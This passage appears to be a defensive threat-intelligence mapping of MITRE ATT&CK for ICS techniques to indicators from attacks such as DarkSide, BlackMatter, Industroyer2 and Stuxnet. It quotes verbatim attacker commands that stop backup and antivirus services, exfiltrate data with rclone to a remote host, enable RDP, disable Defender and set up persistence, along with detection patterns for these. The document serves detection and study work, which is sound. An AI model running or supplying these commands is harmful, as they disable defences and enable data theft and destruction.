SQLAgent$PRACTTICEMGT /y, net stop SQLAgent$PROFXENGAGEMENT /y, net stop SQLAgent$SBSMONITORING /y, net stop SQLAgent$SHAREPOINT /y, net stop SQLAgent$SQL_2008 /y, net stop SQLAgent$SYSTEM_BGC /y, net stop SQLAgent$TPS /y, net stop SQLAgent$TPSAMA /y, net stop SQLAgent$VEEAMSQL2008R2 /y, net stop SQLAgent$VEEAMSQL2012 /y, net stop SQLBrowser /y, net stop SQLSafeOLRService /y, net stop SQLSERVERAGENT /y, net stop SQLTELEMETRY /y, net stop SQLTELEMETRY$ECWDB2 /y, net stop SQLWriter /y, net stop VeeamBackupSvc /y, net stop VeeamBrokerSvc /y, net stop VeeamCatalogSvc /y, net stop VeeamCloudSvc /y, net stop VeeamDeploymentService /y, net stop VeeamDeploySvc /y, net stop VeeamEnterpriseManagerSvc /y, net stop VeeamMountSvc /y, net stop VeeamNFSSvc /y, net stop VeeamRESTSvc /y, net stop VeeamTransportSvc /y, net stop W3Svc /y, net stop wbengine /y, net stop WRSVC /y, net stop MSSQL$VEEAMSQL2008R2 /y, net stop SQLAgent$VEEAMSQL2008R2 /y, net stop VeeamHvIntegrationSvc /y, net stop swi_update /y, net stop SQLAgent$CXDB /y, net stop SQLAgent$CITRIX_METAFRAME /y, net stop “SQL Backups” /y, net stop MSSQL$PROD /y, net stop “Zoolz 2 Service” /y, net stop MSSQLServerADHelper /y, net stop SQLAgent$PROD /y, net stop msftesql$PROD /y, net stop NetMsmqActivator /y, net stop EhttpSrv /y, net stop ekrn /y, net stop ESHASRV /y, net stop MSSQL$SOPHOS /y, net stop SQLAgent$SOPHOS /y, net stop AVP /y, net stop klnagent /y, net stop MSSQL$SQLEXPRESS /y, net stop SQLAgent$SQLEXPRESS /y, net stop wbengine /y, and net stop mfefire /y: Multiple net stop Commands Issued Via Command-Line with Different Arguments

- T0882 - Theft of Operational Information: Anomalous Command Issued Via Command-Line: rclone.exe copy “\\<Server 3>\<Folder path>” remote:<host name> -q –ignore-existing –auto-confirm –multi-thread-streams 12 –transfers 12 C:\Users\<domain admin>\.config\rclone\rclone.conf

- T0884 - Connection Proxy: Anomalous Execution of Executable on Local Host: regsvr32.exe

- T0885 - Commonly Used Port: Anomalous Execution of Executable on Local Host: rundll32.exe, regsvr32.exe, runonce.exe, services.exe, svchost.exe, wuauclt.exe, mstsc.exe, and dllhost.exe: Anomalous Execution of Multiple Executables on Local Host

- T0886 - Remote Services: Anomalous Command Issued Via Command-Line: cmd.exe /C reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f, cmd.exe /C netsh firewall set service type = remotedesktop mode = enable, cmd.exe /C netsh firewall set rule group="remote desktop" new enable=Yes, cmd.exe /C netsh advfirewall set rule group="remote desktop" new enable=Yes, and cmd.exe /C copy 192145.dll \\<INTERNAL_IP>\ADMIN$ /Y /Z: Multiple cmd.exe Commands With Different Arguments

- T0889 - Modify Program: Anomalous Command Issued Via Command-Line: netsh.exe, gpupdate.exe, msiexec.exe, cmd.exe /C reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f, cmd.exe /C reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<Anomalous Binary>", cmd.exe /C netsh firewall set service type = remotedesktop mode = enable, cmd.exe /C netsh firewall set rule group="remote desktop" new enable=Yes, cmd.exe /C netsh advfirewall set rule group="remote desktop" new enable=Yes, C:\Windows\System32\dllhost.exe C:\Windows\System32\cmd.exe /C gpupdate /force, C:\Users\USER\AppData\Local\Temp\<5-11 Random Alphanumeric Characters> C:\Windows\System32\cmd.exe /C gpupdate /force, rundll32.exe C:\windows\192145.dll,StartW C:\Windows\System32\cmd.exe /C gpupdate /force, msiexec.exe /x {[ security application package]} /qn, msiexec.exe /x {[ security application package]} /qn PASSWORD=[password], powershell New-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force, powershell Uninstall-WindowsFeature -Name Windows-Defender, powershell Set-MpPreference -DisableRealtimeMonitoring $true, Command-Line CONTAINS((reg or reg.exe) AND (“HKEY_CURRENT_USER” OR “KEY_CURRENT_MACHINE”) AND “\SOFTWARE\Microsoft\Windows\CurrentVersion\” AND (“run” OR “runonce”)), Command-Line CONTAINS (“schtasks” AND “/create” AND (“cmd” OR powershell”) AND (“.exe” OR “.bat”) AND “/ru system”), and Command-Line CONTAINS ((‘sc’ or ‘sc.exe’) AND ‘create’ AND ‘binpath=”<path to trusted executable>”’ AND start=”auto”): Multiple Anomalous Commands Issued Via Command-Line

- T0890 - Exploitation for Privilege Escalation: Anomalous Command Issued Via Command-Line: C:\Windows\System32\cmd.exe /c echo 4d64fbbbf34 > \\.\pipe\b4312c, C:\Windows\System32\cmd.exe /c echo fbe08e37b62 > \\.\pipe\ab59fc, C:\Windows\System32\cmd.exe /c echo 99269f2c2e0 > \\.\pipe\4bba0e, C:\Windows\System32\cmd.exe /c echo fe08a9c446f > \\.\pipe\254573, C:\Windows\System32\cmd.exe /c echo 849b1389e6a > \\.\pipe\e215fc, and C:\Windows\System32\cmd.exe /c echo [Random 11 characters] > \\.\pipe\[Random 6 characters]: Multiple C:\Windows\System32\cmd.exe Commands Using Named Pipes Issued Via Command-Line

## DARKSIDE RANSOMWARE ATTACK ON COLONIAL PIPELINE

- T0809 - Data Destruction: Anomalous System Behavior on Local Host: Anomalous Deletion of Data: An Object Was Deleted (Windows Event ID 4660)

- T0811 - Data from Information Repositories: Host Data Collection via Dynamic Link Library (DLL) Execution

- T0822 - External Remote Services: Virtual Private Network (VPN) Account Usage

- T0826 - Loss of Availability: Anomalous Inability to Access Systems Within the OT Network

- T0828 - Loss of Productivity and Revenue: Approximately $25 Million Lost in Revenue

- T0859 - Valid Accounts: Leaked Credentials and Passwords Found On Internet

- T0869 - Standard Application Layer Protocol: Hypertext Transfer Protocol (HTTP) POST Request to External IPs

- T0881 - Service Stop: Deletion of Service (Windows Event ID 4660)

- T0882 - Theft of Operational Information: Anomalous Encryption of Host Files: Using RSA-1024

- T0884 - Connection Proxy: Anomalous Application Communication from The Local Host to The Network Proxy Port

- T0890 - Exploitation for Privilege Escalation: Anomalous System Behavior on Local Host: Special Privileges Assigned to New Logon (Windows Event ID 4672)

## BLACKMATTER RANSOMWARE ATTACK ON NEW COOPERATIVE 2021

- T0802 - Automated Collection: Anomalous Behavior Associated with Native Binary on Local Host: Dynamic Link Library (DLL): comsvcs.dll

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: cmd.exe /c \\<domaincontroller>\netlogon\def.vbs

- T0809 - Data Destruction: Anomalous Command Issued Via Command-Line: IWbemServices::ExecQuery - ROOT\CIMV2 : SELECT * FROM Win32_ShadowCopy

- T0819 - Exploit Public-Facing Application: Anomalous Network Traffic: From External Host to Internal Application Server: From External Host to Microsoft Exchange Server: Hypertext Transfer Protocol Secure (HTTPS) Over TCP Port 443: https://<SMTP-address-domain>/autodiscover/autodiscover.xml

- T0820 - Exploitation for Evasion: Anomalous Call to Windows Application Programming Interface (API) on Local Host: ICMLuaUtil

- T0823 - Graphical User Interface: Anomalous Command Issued Via Command-Line: cmd.exe /c \\<domaincontroller>\netlogon\def.vbs

- T0826 - Loss of Availability: Anomalous System Behavior on Local Host: Anomalous Interruption of Automated Processes: Information Technology (IT) Systems: Production Systems: For Eight Weeks

- T0828 - Loss of Productivity and Revenue: Anomalous System Behavior on Local Host: Anomalous Interruption of Automated Processes: Information Technology (IT) Systems: Production Systems: For Eight Weeks

- T0834 - Native API: Anomalous Call to Windows Application Programming Interface (API) on Local Host: NetShareEnum, AdsOpenObject, ADsBuildEnumerator, AdsEnumerateNext, NetShareEnumAll, EnumServicesStatusExW, and NtQuerySystemInformation: Multiple Anomalous Calls to Windows Application Programming Interface (API) on Local Host

- T0846 - Remote System Discovery: Anomalous Call to Windows Application Programming Interface (API) on Local Host: NetShareEnum, AdsOpenObject, ADsBuildEnumerator, AdsEnumerateNext, NetShareEnumAll, EnumServicesStatusExW, and NtQuerySystemInformation: Multiple Anomalous Calls to Windows Application Programming Interface (API) on Local Host

- T0853 - Scripting: Anomalous Call to Windows Application Programming Interface (API) on Local Host: NetShareEnum, AdsOpenObject, ADsBuildEnumerator, AdsEnumerateNext, NetShareEnumAll, and EnumServicesStatusExW: Multiple Anomalous Calls to Windows Application Programming Interface (API) on Local Host

- T0858 - Change Operating Mode: Anomalous Network Traffic: From External Host to Internal Application Server: From External Host to Microsoft Exchange Server: GoLang (GO) Simple Tunnel (GOST) Over UDP Port 5353

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From External Host to Internal Application Server: From External Host to Microsoft Exchange Server: GoLang (GO) Simple Tunnel (GOST) Over UDP Port 5353

- T0872 - Indicator Removal on Host: Anomalous Command Issued Via Command-Line: IWbemServices::ExecQuery - ROOT\CIMV2 : SELECT * FROM Win32_ShadowCopy

- T0881 - Service Stop: Anomalous Command Issued Via Command-Line: pskill ensvc, pskill thebat, pskill mydesktopqos, pskill xfssvccon, pskill firefox, pskill infopath, pskill winword, pskill steam, pskill synctime, pskill notepad, pskill ocomm, pskill onenote, pskill mspub, pskill thunderbird, pskill agensvc, pskill sql, pskill excel, pskill powerpnt, pskill outlook, pskill wordpad, pskill dbeng50, pskill isqlplussvc, pskill sqbcoreservice, pskill oracle, pskill ocautoupds, pskill dbsnmp, pskill msaccess, pskill tbirdconfig, pskill ocssd, pskill mydesktopservice, and pskill visioP: Multiple pskill Commands Issued with Different Arguments

- T0882 - Theft of Operational Information: Anomalous Network Traffic: From External Host to Internal Application Server: From External Host to Microsoft Exchange Server: GoLang (GO) Simple Tunnel (GOST) Over UDP Port 5353

- T0884 - Connection Proxy: Anomalous Network Traffic: From External Host to Internal Application Server: From External Host to Microsoft Exchange Server: GoLang (GO) Simple Tunnel (GOST) Over UDP Port 5353

- T0885 - Commonly Used Port: Anomalous Network Traffic: From External Host to Internal Application Server: From External Host to Microsoft Exchange Server: GoLang (GO) Simple Tunnel (GOST) Over UDP Port 5353

- T0886 - Remote Services: Anomalous Network Traffic: From External Host to Internal Application Server: From External Host to Microsoft Exchange Server: GoLang (GO) Simple Tunnel (GOST) Over UDP Port 5353

- T0890 - Exploitation for Privilege Escalation: Anomalous Call to Windows Application Programming Interface (API) on Local Host: NetShareEnum

## INDUSTROYER2 AND WIPER MALWARE TARGETING UKRAINIAN ENERGY PROVIDER 2022

- T0806 - Brute Force I/O: Anomalous Network Traffic: From Engineering Workstation to Controlled Station: To Eight Specific Hosts: With Private IP Address: IP Address 10.x.x.x: International Electrotechnical Commission (IEC) 104 Protocol Over TCP Port 2404: Containing Double Command Activation Messages (C_DC_NA_1 act)

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: "58 17 * * /bin/bash /var/log/wobf.sh & disown" >> /var/log/tasks"

- T0809 - Data Destruction: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): shred, rm, and dd: Multiple Executions of UNIX Application Programming Interface (API)

- T0816 - Device Restart/Shutdown: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): SysRq

- T0826 - Loss of Availability: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): DeviceIoControl

- T0827 - Loss of Control: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): DeviceIoControl

- T0831 - Manipulation of Control: Anomalous Behavior of Controlled Process: Controlled Process in Anomalous State: Circuit Breakers Open: Power Disconnected from Substation

- T0834 - Native API: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): Crontab, Find, Cat, rm, iproute, and ifconfig: Multiple Executions of UNIX Application Programming Interface (API)

- T0840 - Network Connection Enumeration: Anomalous Network Traffic: From Controlled Station to Engineering Workstation: International Electrotechnical Commission (IEC) 104 Protocol Over TCP Port 2404: Containing TESTFR CON Control Function Messages

- T0846 - Remote System Discovery: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): iproute and ifconfig: Multiple Executions of UNIX Application Programming Interface (API)

- T0849 - Masquerading: Presence of Anomalous Executable on Local Host: On Windows Workstation in Operational Technology (OT) Environment: peremoga.exe: With MD5 Hash 9EC8468DD4A81B0B35C499B31E67375E

- T0853 - Scripting: Anomalous Command Issued Via Command-Line: "58 17 * * /bin/bash /var/log/wobf.sh & disown" >> /var/log/tasks"

- T0855 - Unauthorized Command Message: Anomalous Network Traffic: From Engineering Workstation to Controlled Station: To Eight Specific Hosts: With Private IP Address: IP Address 10.x.x.x: International Electrotechnical Commission (IEC) 104 Protocol Over TCP Port 2404: Containing Double Command Activation Messages (C_DC_NA_1 act)

- T0859 - Valid Accounts: Anomalous Network Traffic: From Local Host to Linux Hosts: Over All Hosts in Class-C Network (/24): Secure Shell (SSH) Over TCP Port 22

- T0867 - Lateral Tool Transfer: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): scp

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From Engineering Workstation to Controlled Station: To Eight Specific Hosts: With Private IP Address: IP Address 10.x.x.x: International Electrotechnical Commission (IEC) 104 Protocol Over TCP Port 2404

- T0872 - Indicator Removal on Host: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): shred, rm, and dd: Multiple Executions of UNIX Application Programming Interface (API)

- T0881 - Service Stop: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): shred, dd, systemctl, svcadm, and ps: Multiple Executions of UNIX Application Programming Interface (API)

- T0883 - Internet Accessible Device: Anomalous Network Traffic: From External Remote Host to Local Host

- T0885 - Commonly Used Port: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): iproute and ifconfig: Multiple Executions of UNIX Application Programming Interface (API)

- T0886 - Remote Services: Anomalous Execution of Application Programming Interface (API): UNIX Application Programming Interface (API): iproute and ifconfig: Multiple Executions of UNIX Application Programming Interface (API)

- T0888 - Remote System Information Discovery: Anomalous Network Traffic: From Domain Controller to Windows Host on Domain: Lightweight Directory Access Protocol (LDAP) Over TCP Port 389

## OPERATIONAL TECHNOLOGY MALWARE FRAMEWORKS BASED ON INCONTROLLER

- T0801 - Monitor Process State: Anomalous Command Issued Via Command-Line

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: Execution of Python Script

- T0809 - Data Destruction: Anomalous Command Issued Via Command-Line

- T0812 - Default Credentials: Anomalous Command Issued Via Command-Line: On Operational Technology (OT) Host: Anomalous Failed Login Attempts

- T0813 - Denial of Control: Anomalous Command Issued Via Command-Line

- T0814 - Denial of Service: Anomalous Command Issued Via Command-Line

- T0815 - Denial of View: Anomalous Command Issued Via Command-Line

- T0816 - Device Restart/Shutdown: Anomalous Command Issued Via Command-Line

- T0826 - Loss of Availability: Anomalous Command Issued Via Command-Line

- T0828 - Loss of Productivity and Revenue: Anomalous Loss of Productivity

- T0831 - Manipulation of Control: Anomalous Behavior of Controlled Process: Controlled Process in Anomalous State

- T0834 - Native API: Anomalous System Behavior on Local Host: Windows Management Instrumentation (WMI)

- T0836 - Modify Parameter: Anomalous Command Issued Via Command-Line

- T0842 - Network Sniffing: Anomalous Command Issued Via Command-Line: tcpdump

- T0843 - Program Download: Anomalous Command Issued Via Command-Line

- T0845 - Program Upload: Anomalous Command Issued Via Command-Line

- T0846 - Remote System Discovery: Anomalous Command Issued Via Command-Line: tcpdump

- T0851 - Rootkit: Anomalous Command Issued Via Command-Line: c:\\asrock\\work\\asrocksdk_v0.0.69\\asrrw\\src\\driver\\src\\objfre_win7_amd64\\amd64\\AsrDrv103.pdb

- T0853 - Scripting: Anomalous Command Issued Via Command-Line: Execution of Python Script

- T0855 - Unauthorized Command Message: Anomalous Command Issued Via Command-Line

- T0858 - Change Operating Mode: Anomalous Command Issued Via Command-Line: Execution of Python Script

- T0859 - Valid Accounts: Anomalous Command Issued Via Command-Line: Anomalous Failed Login Attempts

- T0861 - Point & Tag Identification: Anomalous Network Traffic: From Client Server to Local Hosts: From Client Server with Python Executable to Open Platform Communication (OPC) Unified Architecture (UA) Hosts: Internet Control Message Protocol (ICMP) Echo Request Type 8

- T0863 - User Execution: Anomalous Network Traffic: From External Host to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) GET Request

- T0867 - Lateral Tool Transfer: Anomalous Network Traffic: From External IP to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80

- T0868 - Detect Operating Mode: Anomalous Command Issued Via Command-Line: On Control Device

- T0869 - Standard Application Layer Protocol: Anomalous Command Issued Via Command-Line

- T0879 - Damage to Property: Anomalous Damage to Property

- T0880 - Loss of Safety: Anomalous Behavior of Controlled Process: Sustained Loss of Control

- T0881 - Service Stop: Anomalous Network Traffic: From Local Control Device to Internal Operational Technology (OT) Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Factory Interface Network Service (FINS) Protocol

- T0882 - Theft of Operational Information: Anomalous Command Issued Via Command-Line

- T0885 - Commonly Used Port: Anomalous Network Traffic: From Client Server to Local Hosts: From Client Server with Python Executable to Open Platform Communication (OPC) Unified Architecture (UA) Hosts: Internet Control Message Protocol (ICMP) Echo Request Type 8

- T0886 - Remote Services: Anomalous Command Issued Via Command-Line

- T0888 - Remote System Information Discovery: Anomalous Command Issued Via Command-Line: On Operational Technology (OT) Host: tcpdump Command

- T0889 - Modify Program: Anomalous Command Issued Via Command-Line

- T0890 - Exploitation for Privilege Escalation: Anomalous Command Issued Via Command-Line: c:\\asrock\\work\\asrocksdk_v0.0.69\\asrrw\\src\\driver\\src\\objfre_win7_amd64\\amd64\\AsrDrv103.pdb

## Duqu

- T0811 - Data from Information Repositories: [Duqu](https://attack.mitre.org/software/S0038) downloads additional modules for the collection of data in information repositories, including the Infostealer 2 module that can access data from Windows Shares.(Citation: Symantec)

- T0882 - Theft of Operational Information: [Duqu](https://attack.mitre.org/software/S0038)'s purpose is to gather intelligence data and assets from entities such as industrial infrastructure and system manufacturers, amongst others not in the industrial sector, in order to more easily conduct a future attack against another third party.(Citation: Symantec)

- T0893 - Data from Local System: [Duqu](https://attack.mitre.org/software/S0038) downloads additional modules for the collection of data from local systems. The modules are named: infostealer 1, infostealer 2 and reconnaissance. (Citation: Symantec)

## BlackEnergy

- T0859 - Valid Accounts: [BlackEnergy](https://attack.mitre.org/software/S0089) utilizes valid user and administrator credentials, in addition to creating new administrator accounts to maintain presence. (Citation: Booz Allen Hamilton)


- T0865 - Spearphishing Attachment: [BlackEnergy](https://attack.mitre.org/software/S0089) targeted energy sector organizations in a wide reaching email spearphishing campaign. Adversaries utilized malicious Microsoft Word documents attachments. (Citation: Booz Allen Hamilton)


- T0869 - Standard Application Layer Protocol: [BlackEnergy](https://attack.mitre.org/software/S0089) uses HTTP POST request to contact external command and control servers. (Citation: Booz Allen Hamilton)


## Backdoor.Oldrea

- T0802 - Automated Collection: Using OPC, a component of [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) gathers any details about connected devices and sends them back to the C2 for the attackers to analyze. (Citation: Daavid Hentunen, Antti Tikkanen June 2014)

- T0814 - Denial of Service: The [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) payload has caused multiple common OPC platforms to intermittently crash. This could cause a denial of service effect on applications reliant on OPC communications. (Citation: ICS-CERT August 2018)

- T0846 - Remote System Discovery: The [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) ICS malware plugin relies on Windows networking (WNet) to discover all the servers, including OPC servers, that are reachable by the compromised machine over the network. (Citation: Julian Rrushi, Hassan Farhangi, Clay Howey, Kelly Carmichael, Joey Dabell December 2015)

- T0861 - Point & Tag Identification: The [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) payload has the capability of enumerating OPC tags, in addition to more generic OPC server information. The server data and tag names can provide information about the names and function of control devices. (Citation: ICS-CERT August 2018) (Citation: Daavid Hentunen, Antti Tikkanen June 2014)

- T0862 - Supply Chain Compromise: The [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) RAT is distributed through trojanized installers planted on compromised vendor sites. (Citation: Daavid Hentunen, Antti Tikkanen June 2014)

- T0863 - User Execution: Execution of [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) relies on a user opening a trojanized installer attached to an email. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) (Citation: Kyle Wilhoit)

- T0865 - Spearphishing Attachment: The [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) RAT is distributed through a trojanized installer attached to emails. (Citation: Daavid Hentunen, Antti Tikkanen June 2014)

- T0888 - Remote System Information Discovery: The [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) payload gathers server information that includes CLSID, server name, Program ID, OPC version, vendor information, running state, group count, and server bandwidth. This information helps indicate the role the server has in the control process. (Citation: ICS-CERT August 2018) (Citation: Daavid Hentunen, Antti Tikkanen June 2014)

## Flame

- T0882 - Theft of Operational Information: [Flame](https://attack.mitre.org/software/S0143) can collect AutoCAD design data and visio diagrams as well as other documents that may contain operational information. (Citation: Kevin Savage and Branko Spasojevic)

- T0893 - Data from Local System: [Flame](https://attack.mitre.org/software/S0143) has built-in modules to gather information from compromised computers. (Citation: Kevin Savage and Branko Spasojevic)

## WannaCry

- T0866 - Exploitation of Remote Services: [WannaCry](https://attack.mitre.org/software/S0366) initially infected IT networks, but by means of an exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks. (Citation: Joe Slowik April 2019)

- T0867 - Lateral Tool Transfer: [WannaCry](https://attack.mitre.org/software/S0366) can move laterally through industrial networks by means of the SMB service. (Citation: Joe Slowik April 2019)

## NotPetya

- T0828 - Loss of Productivity and Revenue: [NotPetya](https://attack.mitre.org/software/S0368) disrupted manufacturing facilities supplying vaccines, resulting in a halt of production and the inability to meet demand for specific vaccines. (Citation: David Voreacos, Katherine Chinglinsky, Riley Griffin December 2019)

- T0866 - Exploitation of Remote Services: [NotPetya](https://attack.mitre.org/software/S0368) initially infected IT networks, but by means of an exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks. (Citation: Joe Slowik April 2019)

- T0867 - Lateral Tool Transfer: [NotPetya](https://attack.mitre.org/software/S0368) can move laterally through industrial networks by means of the SMB service. (Citation: Joe Slowik April 2019)

## LockerGoga

- T0827 - Loss of Control: Some of Norsk Hydro's production systems were impacted by a [LockerGoga](https://attack.mitre.org/software/S0372) infection. This resulted in a loss of control which forced the company to switch to manual operations. (Citation: Kevin Beaumont) (Citation: Hydro)

- T0828 - Loss of Productivity and Revenue: While Norsk Hydro attempted to recover from a [LockerGoga](https://attack.mitre.org/software/S0372) infection, most of its 160 manufacturing locations switched to manual (non-IT driven) operations. Manual operations can result in a loss of productivity. (Citation: Kevin Beaumont)(Citation: Hydro)

- T0829 - Loss of View: Some of Norsk Hydro's production systems were impacted by a [LockerGoga](https://attack.mitre.org/software/S0372) infection. This resulted in a loss of view which forced the company to switch to manual operations. (Citation: Kevin Beaumont) (Citation: Hydro)

## Ryuk

- T0828 - Loss of Productivity and Revenue: An enterprise resource planning (ERP) manufacturing server was lost to the [Ryuk](https://attack.mitre.org/software/S0446) attack. The manufacturing process had to rely on paper and existing orders to keep the shop floor open. (Citation: Kelly Jackson Higgins)

## REvil

- T0828 - Loss of Productivity and Revenue: The [REvil](https://attack.mitre.org/software/S0496) malware gained access to an organizations network and encrypted sensitive files used by OT equipment. (Citation: Selena Larson, Camille Singleton December 2020)

- T0849 - Masquerading: [REvil](https://attack.mitre.org/software/S0496) searches for whether the Ahnlab autoup.exe service is running on the target system and injects its payload into this existing process. (Citation: Tom Fakterman August 2019)

- T0853 - Scripting: [REvil](https://attack.mitre.org/software/S0496) utilizes JavaScript, WScript, and PowerShell scripts to execute. The malicious JavaScript attachment has an obfuscated PowerShell script that executes the malware. (Citation: Tom Fakterman August 2019)

- T0863 - User Execution: [REvil](https://attack.mitre.org/software/S0496) initially executes when the user clicks on a JavaScript file included in the phishing emails .zip attachment. (Citation: Tom Fakterman August 2019)

- T0869 - Standard Application Layer Protocol: [REvil](https://attack.mitre.org/software/S0496) sends HTTPS POST messages with randomly generated URLs to communicate with a remote server. (Citation: Tom Fakterman August 2019) (Citation: SecureWorks September 2019)

- T0881 - Service Stop: [REvil](https://attack.mitre.org/software/S0496) searches for all processes listed in the prc field within its configuration file and then terminates each process. (Citation: McAfee Labs October 2019)

- T0882 - Theft of Operational Information: [REvil](https://attack.mitre.org/software/S0496) sends exfiltrated data from the victims system using HTTPS POST messages sent to the C2 system. (Citation: McAfee Labs October 2019) (Citation: SecureWorks September 2019)

- T0886 - Remote Services: [REvil](https://attack.mitre.org/software/S0496) uses the SMB protocol to encrypt files located on remotely connected file shares. (Citation: Max Heinemeyer February 2020)

## Stuxnet

- T0801 - Monitor Process State: [Stuxnet](https://attack.mitre.org/software/S0603) examines fields recorded by the DP_RECV monitor to determine if the target system is in a particular state of operation. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0807 - Command-Line Interface: [Stuxnet](https://attack.mitre.org/software/S0603) will store and execute SQL code that will extract and execute Stuxnet from the saved CAB file using xp_cmdshell with the following command: `set @s = master..xp _ cmdshell extrac32 /y +@t+ +@t+x; exec(@s);` (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0821 - Modify Controller Tasking: [Stuxnet](https://attack.mitre.org/software/S0603) infects OB1 so that its malicious code sequence is executed at the start of a cycle. It also infects OB35. OB35 acts as a watchdog, and on certain conditions, it can stop the execution of OB1. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0831 - Manipulation of Control: [Stuxnet](https://attack.mitre.org/software/S0603) can reprogram a PLC and change critical parameters in such a way that legitimate commands can be overridden or intercepted. In addition, Stuxnet can apply inappropriate command sequences or parameters to cause damage to property. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0832 - Manipulation of View: [Stuxnet](https://attack.mitre.org/software/S0603) manipulates the view of operators replaying process input and manipulating the I/O image to evade detection and inhibit protection functions. (Citation: Langer Stuxnet) (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0834 - Native API: [Stuxnet](https://attack.mitre.org/software/S0603) calls system function blocks which are part of the operating system running on the PLC. Theyre used to execute system tasks, such as reading the system clock (SFC1) and generating data blocks on the fly. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0835 - Manipulate I/O Image: When the peripheral output is written to, sequence C intercepts the output and ensures it is not written to the process image output. The output is the instructions the PLC sends to a device to change its operating behavior. By intercepting the peripheral output, [Stuxnet](https://attack.mitre.org/software/S0603) prevents an operator from noticing unauthorized commands sent to the peripheral. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0836 - Modify Parameter: In states 3 and 4 [Stuxnet](https://attack.mitre.org/software/S0603) sends two network bursts (done through the DP_SEND primitive). The data in the frames are instructions for the frequency converter drives. For example one of the frames contains records that change the maximum frequency (the speed at which the motor will operate). The frequency converter drives consist of parameters, which can be remotely configured via Profibus. One can write new values to these parameters changing the behavior of the device. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0842 - Network Sniffing: DP_RECV is the name of a standard function block used by network coprocessors. It is used to receive network frames on the Profibus  a standard industrial network bus used for distributed I/O. The original block is copied to FC1869, and then replaced by a malicious block. Each time the function is used to receive a packet, the malicious [Stuxnet](https://attack.mitre.org/software/S0603) block takes control: it will call the original DP_RECV in FC1869 and then perform postprocessing on the packet data. The replaced DP_RECV block (later on referred to as the DP_RECV monitor) is meant to monitor data sent by the frequency converter drives to the 315-2 CPU via CP 342-5 Profibus communication modules. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0843 - Program Download: [Stuxnet](https://attack.mitre.org/software/S0603)'s infection sequence consists of code blocks and data blocks that will be downloaded to the PLC to alter its behavior. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0847 - Replication Through Removable Media: [Stuxnet](https://attack.mitre.org/software/S0603) was able to self-replicate by being spread through removable drives. A willing insider or unknown third party, such as a contractor, may have brought the removable media into the target environment. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011) The earliest version of Stuxnet relied on physical installation, infecting target systems when an infected configuration file carried by a USB stick was opened. (Citation: Langer Stuxnet)

- T0849 - Masquerading: [Stuxnet](https://attack.mitre.org/software/S0603) renames s7otbxdx.dll, a dll responsible for handling communications with a PLC. It replaces this dll file with its own version that allows it to intercept any calls that are made to access the PLC. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

- T0851 - Rootkit: One of [Stuxnet](https://attack.mitre.org/software/S0603)'s rootkits is contained entirely in the fake s7otbxdx.dll. In order to continue existing undetected on the PLC it needs to account for at least the following situations: read requests for its own malicious code blocks, read requests for infected blocks (OB1, OB35, DP_RECV), and write requests that could overwrite Stuxnets own code. Stuxnet contains code to monitor and intercept these types of requests. The rootkit modifies these requests so that Stuxnets PLC code is not discovered or damaged. (Citation: Langer Stuxnet)

- T0863 - User Execution: [Stuxnet](https://attack.mitre.org/software/S0603) infects DLL's associated with the WinCC Simatic manager which are responsible for opening project files. If a user opens an uninfected project file using a compromised manager, the file will be infected with Stuxnet code. If an infected project is opened with the Simatic manager, the modified data file will trigger a search for the `xyz.dll` file. If the `xyz.dll` file is not found in any of the specified locations, the malicious DLL will be loaded and executed by the manager. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)

